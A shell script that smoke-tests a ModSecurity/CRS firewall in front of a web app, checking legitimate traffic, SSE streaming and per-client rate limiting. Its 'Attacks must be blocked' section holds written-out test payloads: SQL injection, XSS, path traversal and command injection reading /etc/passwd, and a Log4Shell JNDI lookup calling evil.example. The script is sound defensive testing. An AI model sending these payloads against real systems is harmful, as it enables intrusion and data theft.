#!/bin/sh
# Exercises the ModSecurity/CRS rules in front of the app.
#
# full (default): against docker-compose.waf.yml, real API and database
# --stub: against scripts/waf/stub-backend.mjs, no API or database (the CI job)
set -eu

BASE_URL="${BASE_URL:-http://localhost:8080}"
MODE=full
[ "${1:-}" = "--stub" ] && MODE=stub

passed=0
failed=0

if [ -t 1 ]; then GREEN=$(printf '\033[32m'); RED=$(printf '\033[31m'); OFF=$(printf '\033[0m')
else GREEN=''; RED=''; OFF=''; fi

ok() { passed=$((passed + 1)); printf '  %sPASS%s  %s\n' "$GREEN" "$OFF" "$1"; }
bad() { failed=$((failed + 1)); printf '  %sFAIL%s  %s -- %s\n' "$RED" "$OFF" "$1" "$2"; }

# status METHOD PATH [JSON_BODY] [CLIENT_IP] [USER_AGENT]
status() {
  _method=$1; _path=$2; _body=${3:-}; _ip=${4:-}; _ua=${5:-}
  set -- -s -o /dev/null -w '%{http_code}' --path-as-is --max-time 20 -X "$_method"
  [ -n "$_ip" ] && set -- "$@" -H "X-Forwarded-For: $_ip"
  [ -n "$_ua" ] && set -- "$@" -A "$_ua"
  [ -n "$_body" ] && set -- "$@" -H 'Content-Type: application/json' --data-binary "$_body"
  curl "$@" "$BASE_URL$_path"
}

# The WAF answers a rejected request itself, so anything that reached the app
# counts as allowed even when the app then refuses it (401, 400, 404).
allowed() {
  if [ "$2" = "403" ]; then bad "$1" "blocked with 403"; else ok "$1"; fi
}

# 403 is ModSecurity; 400 is nginx rejecting a malformed request line before
# ModSecurity sees it. Both mean the request never reached the app.
blocked() {
  case "$2" in
    403 | 400) ok "$1" ;;
    *) bad "$1" "expected a block, got $2" ;;
  esac
}

exact() {
  if [ "$2" = "$3" ]; then ok "$1"; else bad "$1" "expected $2, got $3"; fi
}

printf '\nWAF smoke tests (%s mode) against %s\n\n' "$MODE" "$BASE_URL"

printf 'Legitimate traffic must pass\n'
exact   "serves the SPA at /"                        200 "$(status GET /)"
exact   "serves /healthz without touching the API"   200 "$(status GET /healthz)"
exact   "falls back to the SPA on a deep link"       200 "$(status GET /clusters/1)"
allowed "auth login with a normal JSON body"         "$(status POST /api/auth/login '{"email":"person@example.com","password":"correct horse battery staple"}' 198.51.100.11)"
allowed "auth register with a high-entropy password" "$(status POST /api/auth/register '{"email":"person@example.com","password":"xK9#mQ2$vL8@pR4!zN6&wT1%"}' 198.51.100.12)"
allowed "an email address containing an apostrophe"  "$(status POST /api/auth/login '{"email":"o'\''brien@example.com","password":"correct horse battery staple"}' 198.51.100.13)"
allowed "the SSE endpoint reaches the app"           "$(status GET /api/clusters/1/events '' 198.51.100.14)"

printf '\nAttacks must be blocked\n'
blocked "SQL injection in the query string"   "$(status GET "/?id=1%27%20OR%20%271%27%3D%271")"
blocked "reflected XSS in the query string"   "$(status GET "/?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E")"
blocked "path traversal"                      "$(status GET "/../../etc/passwd")"
blocked "encoded path traversal"              "$(status GET "/api/%2e%2e%2f%2e%2e%2fetc%2fpasswd")"
blocked "command injection"                   "$(status GET "/?cmd=%3Bcat%20%2Fetc%2Fpasswd")"
blocked "Log4Shell JNDI lookup"               "$(status GET "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D")"
blocked "SQL injection inside a JSON body"    "$(status POST /api/auth/login '{"email":"a@b.co'\'' OR 1=1--","password":"x"}')"
blocked "a known scanner user agent"          "$(status GET / '' '' 'sqlmap/1.7#stable (http://sqlmap.org)')"

if [ "$MODE" = stub ]; then
  printf '\nResponse streaming must not be buffered\n'
  # If ModSecurity buffers responses, the live occupancy feed would stop updating
  ticks=$(mktemp)
  curl -sN --max-time 12 --path-as-is "$BASE_URL/api/clusters/1/events" 2>/dev/null \
    | while IFS= read -r line; do
        case "$line" in data:*) date +%s >> "$ticks" ;; esac
      done
  count=$(wc -l < "$ticks" | tr -d ' ')
  if [ "$count" -ge 3 ]; then
    spread=$(( $(tail -1 "$ticks") - $(head -1 "$ticks") ))
    if [ "$spread" -ge 2 ]; then
      ok "SSE events arrive incrementally (${count} events over ${spread}s)"
    else
      bad "SSE events arrive incrementally" "all ${count} events arrived within ${spread}s, so something buffered them"
    fi
  else
    bad "SSE events arrive incrementally" "only ${count} events arrived"
  fi
  rm -f "$ticks"
else
  printf '\nRate limiting must key on the client, not the proxy\n'
  # The API allows 10 auth attempts per minute per client. If the proxy address
  # were used as the key, every caller would share one bucket and the second
  # client below would already be exhausted.
  i=1
  while [ "$i" -le 11 ]; do
    last=$(status POST /api/auth/login '{"email":"person@example.com","password":"wrong-password"}' 203.0.113.70)
    i=$((i + 1))
  done
  exact "an 11th attempt from one client is rate limited" 429 "$last"
  other=$(status POST /api/auth/login '{"email":"person@example.com","password":"wrong-password"}' 203.0.113.71)
  if [ "$other" = "429" ]; then
    bad "a different client keeps its own budget" "got 429, so clients share one bucket (check trust proxy and set_real_ip_from)"
  else
    ok "a different client keeps its own budget"
  fi
fi

printf '\n%d passed, %d failed\n\n' "$passed" "$failed"
[ "$failed" -eq 0 ]
